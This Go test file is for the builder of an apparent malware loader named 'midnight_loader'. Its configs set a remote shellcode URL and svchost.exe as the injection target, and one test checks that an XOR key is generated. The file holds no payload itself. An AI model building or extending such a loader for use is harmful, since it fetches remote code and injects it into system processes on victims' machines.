package builder_test

import (
	"context"
	"os/exec"
	"strings"
	"testing"

	"midnight_loader/internal/builder"
	"midnight_loader/internal/config"
)

func TestBuildValidatesEmptyURL(t *testing.T) {
	cfg := config.BuildConfig{InjectionTarget: "C:\\Windows\\System32\\svchost.exe"}
	err := builder.Build(context.Background(), cfg, func(string) {})
	if err == nil || !strings.Contains(err.Error(), "shellcode_url") {
		t.Fatalf("expected shellcode_url error, got %v", err)
	}
}

func TestBuildValidatesInjectionTarget(t *testing.T) {
	cfg := config.BuildConfig{ShellcodeURL: "http://example.com/x.bin"}
	err := builder.Build(context.Background(), cfg, func(string) {})
	if err == nil || !strings.Contains(err.Error(), "injection_target") {
		t.Fatalf("expected injection_target error, got %v", err)
	}
}

func TestBuildGeneratesKeyIfBlank(t *testing.T) {
	if _, err := exec.LookPath("g++"); err != nil {
		t.Skip("g++ not on PATH")
	}
	cfg := config.BuildConfig{
		ShellcodeURL:    "http://example.com/payload.bin",
		InjectionTarget: "C:\\Windows\\System32\\svchost.exe",
		OutputPath:      t.TempDir(),
	}
	var logs []string
	_ = builder.Build(context.Background(), cfg, func(s string) { logs = append(logs, s) })
	for _, l := range logs {
		if strings.Contains(l, "xor key:") {
			return
		}
	}
	t.Error("expected a log line containing 'xor key:'")
}
